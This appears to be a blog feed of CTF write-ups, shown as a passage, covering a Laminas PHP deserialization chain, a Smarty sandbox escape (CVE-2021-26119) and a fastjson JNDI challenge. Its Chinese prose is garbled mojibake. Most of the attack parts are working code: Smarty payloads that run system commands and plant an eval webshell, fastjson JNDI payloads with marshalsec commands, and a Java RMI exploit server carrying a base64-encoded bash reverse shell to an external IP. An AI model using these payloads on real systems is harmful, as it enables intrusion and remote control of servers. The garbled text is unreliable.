<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$argv</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$plugin</span> = <span class="keyword">$this</span>-&gt;plugin(<span class="variable">$method</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable(<span class="variable">$plugin</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="variable">$plugin</span>, <span class="variable">$argv</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$plugin</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>plugin</code>æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">plugin</span>(<span class="params"><span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$options</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getHelperPluginManager()-&gt;get(<span class="variable">$name</span>, <span class="variable">$options</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¸ª<code>getHelperPluginManager()</code>æ–¹æ³•ï¼Œç›´æ¥è¿”å›äº†<code>$this-&gt;__helpers</code>ï¼Œæ˜¾è€Œæ˜“è§è¿™ä¸ªå±æ€§æ˜¯æˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHelperPluginManager</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> === <span class="keyword">$this</span>-&gt;__helpers) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setHelperPluginManager(<span class="keyword">new</span> HelperPluginManager(<span class="keyword">new</span> ServiceManager()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;__helpers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£å†å›å»çœ‹<code>plugin</code>æ–¹æ³•ï¼Œå‘ç°è¦è°ƒç”¨æ‰€è¿”å›çš„æ–¹æ³•é‡Œé¢çš„<code>get</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå¯ä»¥ç»§ç»­å»æ‰¾å“ªé‡Œå­˜åœ¨æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„getæ–¹æ³•</p>
<p><code>Config</code>-getï¼Œç›´æ¥è¿”å›<code>$this-&gt;data[&#39;shutdown&#39;]</code>çš„å€¼ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œå°±æ¯”å¦‚æˆ‘ä»¬åˆå§‹åŒ–<code>$this-&gt;data[&#39;shutdown&#39;] = &#39;phpinfo&#39;</code>ï¼Œè¿™æ ·ä¼šå°†<code>phpinfo</code>ä¸€ç›´è¿”å›åˆ°<code>call_user_func_array($plugin, $argv);</code>ï¼Œè€Œå› ä¸ºshutdownæ–¹æ³•å¹¶æ²¡æœ‰å‚æ•°ï¼Œæ‰€ä»¥å°±ä¼šç›´æ¥æ‰§è¡Œ<code>phpinfo();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å°±åƒæˆ‘è¯´çš„é™åˆ¶ä¸€æ ·ï¼Œè¿™é‡Œä¸èƒ½ä¼ å…¥å‚æ•°ï¼Œåªèƒ½æ‰§è¡ŒæŸä¸€ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨<code>PhpRenderer</code>çš„<code>__call</code>ï¼Œå¾—å†æ‰¾æ‰¾ï¼Œä½†æ˜¯æ‰¾åˆ°çš„<code>__call</code>æ–¹æ³•è¦ä¹ˆæ˜¯ç›´æ¥è¿”å›ä¸€ä¸ªåå­—ï¼Œè¦ä¹ˆé™åˆ¶è¿‡å¤š</p>
<p>å†è¿”å›åˆ°<code>Logger</code>ï¼Œçªç„¶æƒ³åˆ°é‚£ä¹ˆç›´æ¥æ‰¾<code>shutdown</code>æ–¹æ³•å‘¢</p>
<p>åªæœ‰<code>Mail</code>æ–¹æ³•å¥½åƒå¯ä»¥ç”¨ï¼Œå®¡è®¡ä¸€ä¸‹å§ï¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// If there are events to mail, use them as message body.  Otherwise,</span></span><br><span class="line">    <span class="comment">// there is no mail to be sent.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;eventsToMail)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;subjectPrependText !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Tack on the summary of entries per-priority to the subject</span></span><br><span class="line">        <span class="comment">// line and set it on the Laminas\Mail object.</span></span><br><span class="line">        <span class="variable">$numEntries</span> = <span class="keyword">$this</span>-&gt;getFormattedNumEntriesPerPriority();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mail-&gt;setSubject(<span class="string">&quot;<span class="subst">&#123;$this-&gt;subjectPrependText&#125;</span> (<span class="subst">&#123;$numEntries&#125;</span>)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Always provide events to mail as plaintext.</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mail-&gt;setBody(implode(PHP_EOL, <span class="keyword">$this</span>-&gt;eventsToMail));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Finally, send the mail.  If an exception occurs, convert it into a</span></span><br><span class="line">    <span class="comment">// warning-level message so we can avoid an exception thrown without a</span></span><br><span class="line">    <span class="comment">// stack frame.</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;transport-&gt;send(<span class="keyword">$this</span>-&gt;mail);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TransportException\ExceptionInterface <span class="variable">$e</span>) &#123;</span><br><span class="line">        trigger_error(</span><br><span class="line">            <span class="string">&quot;unable to send log entries via email; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;message = <span class="subst">&#123;$e-&gt;getMessage()&#125;</span>; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;code = <span class="subst">&#123;$e-&gt;getCode()&#125;</span>; &quot;</span> .</span><br><span class="line">            <span class="string">&quot;exception class = &quot;</span> . get_class(<span class="variable">$e</span>),</span><br><span class="line">            E_USER_WARNING</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.é¦–å…ˆè¦æ±‚<code>$this-&gt;eventsToMail</code>ä¸ä¸ºç©º</p>
<p>2.<code>getFormattedNumEntriesPerPriority()</code>æ–¹æ³•æ˜¯å°†<code>$this-&gt;numEntriesPerPriority </code>æ•°ç»„è½¬æˆå­—ç¬¦ä¸²å¹¶è¿”å›å­—ç¬¦ä¸²ï¼Œè€Œæœç´¢äº†ä¸€ä¸‹å‘ç°æ²¡æœ‰å¯ç”¨çš„<code>setSubject</code>æ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç»™<code>$this-&gt;subjectPrependText </code>èµ‹å€¼ä¸ºnull</p>
<p>3.å¯ä»¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„<code>setBody</code>ï¼Œä½†æ˜¯æ‰¾äº†ä¸€åœˆä¸åœ¨ï¼Œé‚£åˆåˆåˆæƒ³åˆ°äº†<code>__call</code>æ–¹æ³•ï¼Œå› ä¸ºè¿™æ¬¡æˆ‘ä»¬å¯ä»¥ä¼ å…¥æˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œæ‰€ä»¥åˆæƒ³åˆ°äº†<code>PhpRenderer</code>çš„<code>__call</code>æ–¹æ³•ï¼Œç„¶åå†ç”¨<code>Config</code>é‡Œé¢çš„getæ–¹æ³•ï¼Œåˆå§‹åŒ–<code>$this-&gt;data[&#39;setBody&#39;] = &#39;system&#39;</code>ï¼Œç„¶ååªè¦æˆ‘ä»¬é€šè¿‡ä¿®æ”¹<code>$this-&gt;eventsToMail</code>çš„å€¼æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œå°±å¥½äº†</p>
<p><strong>0x02:Stream-destructå¼€å§‹</strong></p>
<p>åœ¨ç”¨åˆ«çš„å¸ˆå‚…çš„pocä¹‹å‰ï¼Œå› ä¸ºæœ€å¼€å§‹çœ‹çš„cveè¯´æ˜¯ä»<code>Stream</code>çš„<code>__destruct</code>æ–¹æ³•å¼€å§‹çš„ï¼Œç„¶åç™¾åº¦å’Œè¿™ä¸ªé¢˜ç›®ç»™çš„ä¸å¤§ä¸€æ ·ï¼ŒåŸæ¥çš„ifåˆ¤æ–­åªåˆ¤æ–­äº†<code>$this-&gt;cleanup</code>æ˜¯å¦ä¸ºç©ºï¼Œå¯¼è‡´å†unlinkçš„æ—¶å€™è§¦å‘<code>toString</code>æ–¹æ³•ï¼Œä½†æ˜¯å…¶å®è¿™é‡Œçš„<code>file_exits</code>ä¹Ÿèƒ½è§¦å‘<code>toString</code>æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_resource(<span class="keyword">$this</span>-&gt;stream)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream = <span class="literal">null</span>; <span class="comment">//Could be listened by others</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cleanup &amp;&amp; is_string(<span class="keyword">$this</span>-&gt;streamName) &amp;&amp; file_exists(<span class="keyword">$this</span>-&gt;streamName)) &#123;</span><br><span class="line">            ErrorHandler::start(E_WARNING);</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;streamName);</span><br><span class="line">            ErrorHandler::stop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ä¹‹åæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„<code>toString</code>æ–¹æ³•ï¼Œç„¶è€Œå¹¶æ²¡æœ‰ï¼ˆğŸ˜…</p>
<h4 id="Smarty-Calculator"><a href="#Smarty-Calculator" class="headerlink" title="Smarty_Calculator"></a>Smarty_Calculator</h4><ul>
<li>Smartyæ²™ç®±ç»•è¿‡</li>
<li>CVE-2021-26119</li>
<li>CVE-2021-29454</li>
</ul>
<blockquote>
<p>å¤ç°æ</p>
</blockquote>
<h5 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h5><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26119">CVE - CVE-2021-26119 (mitre.org)</a></p>
<p><a href="https://www.cnblogs.com/sukusec301/p/15832670.html">CVE-2021-26119 PHP Smarty æ¨¡ç‰ˆæ²™ç®±é€ƒé€¸è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ - sukusecä¸è§‰æ°´æµ - åšå®¢å›­ (cnblogs.com)</a></p>
<h5 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h5><p><code>www.zip</code>æ³„éœ²</p>
<p><code>index.php</code>ï¼Œä¼šå…ˆåˆ¤æ–­Cookieï¼Œæ£€æµ‹Â·æ˜¯å¦ç™»å½•ï¼Œå¹¶ä¸”è¿‡æ»¤äº†<code>php|&lt;|flag|?</code>ï¼Œä¹‹åç›´æ¥è°ƒç”¨<code>Smarty#display</code>ï¼Œå°†dataä¼ è¿›å»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$pattern</span> = <span class="string">&quot;php|\&lt;|flag|\?&quot;</span>;</span><br><span class="line">  <span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$pattern</span>);</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$value</span>/&quot;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">		  <span class="keyword">echo</span>(<span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Calculator don  not like U&lt;h5&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">          <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$data</span> = waf(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Only smarty people can use calculators:&lt;h5&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span> . <span class="variable">$data</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;ä½ è¿˜æ²¡æœ‰ç™»å½•\&quot;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.venustech.com.cn/new_type/aqtg/20210226/22409.html">PHP Smartyæ¨¡ç‰ˆä»£ç æ³¨å…¥æ¼æ´ï¼ˆCVE-2021-26120ï¼‰-å¯æ˜æ˜Ÿè¾° (venustech.com.cn)</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;function+name=&#x27;rce()&#123;&#125;;system(&quot;id&quot;);function%0A%0A&#x27;&#125;&#123;/function&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸èƒ½è·¯å¾„ç©¿è¶Š</p>
<p>å¯ä»¥å†™å…¥ä¸€å¥è¯</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;function+name=&#x27;rce()&#123;&#125;;eval($_POST[&quot;1&quot;]);function%0A%0A&#x27;&#125;&#123;/function&#125;</span><br><span class="line"></span><br><span class="line">?1=system(&#x27;cat%20/flag&#x27;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>çº¢æ˜è°·</tag>
      </tags>
  </entry>
  <entry>
    <title>è“å¸½æ¯-EzGadget</title>
    <url>/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF-EzGadget/</url>
    <content><![CDATA[<h1 id="è“å¸½æ¯-Ez-gadget"><a href="#è“å¸½æ¯-Ez-gadget" class="headerlink" title="[è“å¸½æ¯]Ez_gadget"></a>[è“å¸½æ¯]Ez_gadget</h1><ul>
<li>fastjson</li>
</ul>
<p>èµ›åå¤ç°ï¼š</p>
<p>åˆ©ç”¨é¢˜ç›®ç»™çš„jaråŒ…å¼€ä¸€ä¸ªç¯å¢ƒ</p>
<p><img src="https://img-blog.csdnimg.cn/d2812c6ccb0443539cac5a39f9172e1f.png" alt="Untitled"></p>
<h2 id="å®¡è®¡"><a href="#å®¡è®¡" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h2><p>å¯ä»¥é¦–å…ˆçœ‹ä¸€ä¸‹ä¾èµ–åŒ…é‡Œé¢ï¼Œå¯ä»¥å‘ç°å­˜åœ¨fastjson1.2.62ä¾èµ–å’ŒTomcatä¾èµ–ï¼Œè€Œfastjson1.2.62çš„æ¼æ´ç™¾åº¦ä¸€ä¸‹å¯ä»¥å‘ç°payload</p>
<blockquote>
<p>{â€œ@typeâ€:â€org.apache.xbean.propertyeditor.JndiConverterâ€,â€AsTextâ€:â€rmi://127.0.0.1:1099/exploitâ€}</p>
</blockquote>
<p><a href="https://www.cnblogs.com/tr1ple/p/12348886.html">https://www.cnblogs.com/tr1ple/p/12348886.html</a></p>
<p><img src="https://img-blog.csdnimg.cn/31f3451bfff3409fa9b0508edbe39cdb.png" alt="Untitled"></p>
<p>å­˜åœ¨ä¸€ä¸ªsecretkeyï¼Œåœ¨jsonè·¯ç”±ä¸‹å¯ä»¥å‘ç°å­˜åœ¨JSONååºåˆ—åŒ–ï¼Œå¹¶ä¸”è®¾ç½®äº†<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code> ï¼Œè¯´æ˜å¯ä»¥åˆ©ç”¨<code>@type</code> å®ç°fastjsonååºåˆ—åŒ–æ¼æ´ï¼Œä½†æ˜¯ifè¯­å¥çœ‹ä¸€ä¸‹å¯ä»¥å‘ç°å­˜åœ¨hashç¢°æ’</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicclass JSONController &#123;</span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Your key is:&quot;</span> + secret.getKey();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/json&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Unserjson</span><span class="params">(<span class="meta">@RequestParam</span> String str, <span class="meta">@RequestParam</span> String input)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (str !=<span class="keyword">null</span> &amp;&amp;</span><br><span class="line">      Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) &#123;</span><br><span class="line">      String pattern = <span class="string">&quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\\\\\x.*&quot;</span>;</span><br><span class="line">      Pattern p = Pattern.compile(pattern, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">boolean</span> StrMatch = p.matcher(input).matches();</span><br><span class="line"><span class="keyword">if</span> (StrMatch)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Hacker get out!!!&quot;</span>;</span><br><span class="line">      ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">      JSON.parseObject(input);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java">https://stackoverflow.com/questions/12925988/how-to-generate-strings-that-share-the-same-hashcode-in-java</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">samehash</span><span class="params">(String s, <span class="keyword">int</span> level)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    String sub2 = s.substring(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">char</span> c0 = sub2.charAt(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> c1 = sub2.charAt(<span class="number">1</span>);</span><br><span class="line">    c0 = (<span class="keyword">char</span>) (c0 + level);</span><br><span class="line">    c1 = (<span class="keyword">char</span>) (c1 - <span class="number">31</span> * level);</span><br><span class="line">    String newsub2 = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; c0, c1 &#125;);</span><br><span class="line">    String re =  newsub2 + s.substring(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨æ­£åˆ™åŒ¹é…ï¼Œä»è€Œå­˜åœ¨è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨unicodeåŠ å¯†ç»•è¿‡</p>
<p>è¿‡æ»¤ï¼š<code>String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\\\\\x.*&quot;;</code></p>
<h2 id="è¸©å‘1"><a href="#è¸©å‘1" class="headerlink" title="è¸©å‘1"></a>è¸©å‘1</h2><p>å› ä¸º<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code> æ‰“å¼€äº†autotypeï¼Œæ‰€æœ‰å­˜åœ¨fastjson1.2.62çš„RCEï¼Œé‚£å°±ç›´æ¥åˆ©ç”¨<code>marshalsec</code> å¼€ä¸€ä¸ªladpæœåŠ¡ï¼Œå¹¶åœ¨vpsæŸä¸ªç›®å½•ä¸‹æ”¾ä¸€ä¸ªæ¶æ„ç±»ï¼Œç”¨pythonå¼€æœåŠ¡å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<p>pythonï¼š</p>
<blockquote>
<p>python3 -m http.server â€”bind 0.0.0.0 8888</p>
</blockquote>
<p>marshalsec:</p>
<blockquote>
<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer â€˜<a href="http://your_ip:8888/#Exploit&#39;">http://your_ip:8888/#Exploit&#39;</a></p>
</blockquote>
<p>payload:</p>
<blockquote>
<p>{â€œ@typeâ€:â€org.apache.xbean.propertyeditor.JndiConverterâ€,â€AsTextâ€:â€rmi://ip:1099/exploitâ€}</p>
</blockquote>
<p>ä½†æ˜¯å‘ç°è™½ç„¶æ¥æ”¶åˆ°äº†ä½†æ˜¯æ²¡æœ‰è½¬åˆ°æˆ‘ä»¬çš„æ¶æ„ç±»é‚£è¾¹ï¼Œæ²¡æœ‰æ‰“å¼€codebase</p>
<p><img src="https://img-blog.csdnimg.cn/fe7609da3b3d4513a90cae2952432937.png" alt="QQå›¾ç‰‡20220710193008.png"></p>
<h2 id="è¸©å‘2"><a href="#è¸©å‘2" class="headerlink" title="è¸©å‘2"></a>è¸©å‘2</h2><p>å› ä¸ºorg.apache.naming.factory.BeanFactory å­˜åœ¨äºTomcatä¾èµ–åŒ…ä¸­ï¼Œç”¨çš„æ˜¯SUSçš„exp</p>
<p>æ‰“åŒ…æˆjaråŒ…ä¹‹åæ”¾åˆ°vpsä¸Šæ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> other;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tomc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rmi_port = <span class="number">9999</span>;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;82.156.2.166&quot;</span>);</span><br><span class="line">        System.out.println(System.getProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>));</span><br><span class="line"><span class="comment">//        String command =&quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;\\&quot;)&quot;;</span></span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\\&quot;</span>bash -c &#123;echo,YmFzaCUyMC1pJTIwJTNFJTI2L2Rldi90Y3AvODIuMTU2LjIuMTY2LzIzMzclMjAwJTNFJTI2MQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\<span class="string">&quot;);&quot;</span>;</span><br><span class="line">        String command = <span class="string">&quot;\\&quot;</span>\\<span class="string">&quot;.getClass().forName(\\&quot;</span>javax.script.ScriptEngineManager\\<span class="string">&quot;).newInstance().getEngineByName(\\&quot;</span>JavaScript\\<span class="string">&quot;).eval(\\&quot;</span><span class="string">&quot;+cmd+&quot;</span>\\<span class="string">&quot;)&quot;</span>;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(rmi_port);</span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="keyword">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="keyword">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;KINGX=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">&quot;KINGX&quot;</span>, command));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¼¹shellæ²¡æœ‰æˆåŠŸ</p>
<h2 id="æœ¬åœ°å¤ç°"><a href="#æœ¬åœ°å¤ç°" class="headerlink" title="æœ¬åœ°å¤ç°"></a>æœ¬åœ°å¤ç°</h2><p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/</a></p>
<p>æŠŠTomcç±»ä¸­çš„payloadè¿›è¡Œä¿®æ”¹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡ŒTomcç±»ï¼Œå¼€å¯RMIæœåŠ¡</p>
<p>payload:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatAttack</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//        JndiConverter</span></span><br><span class="line">    